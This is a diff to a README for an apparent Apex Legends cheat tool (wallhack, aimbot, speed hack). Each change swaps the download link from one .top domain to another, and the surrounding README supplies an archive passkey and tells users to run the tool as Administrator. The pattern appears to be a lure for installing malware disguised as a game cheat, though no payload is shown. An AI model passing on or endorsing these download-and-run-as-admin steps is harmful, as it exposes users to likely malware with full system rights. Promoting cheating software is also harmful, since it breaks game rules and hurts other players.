@@ -6,7 +6,7 @@ Apex Legends external tool with ESP wallhack, aimbot, no recoil, speed hack, unl
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -85,7 +85,7 @@ Archive passkey: `Github`
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 2. Extract the archive.
 3. Launch Apex Legends.
 4. Run the tool **as Administrator**.
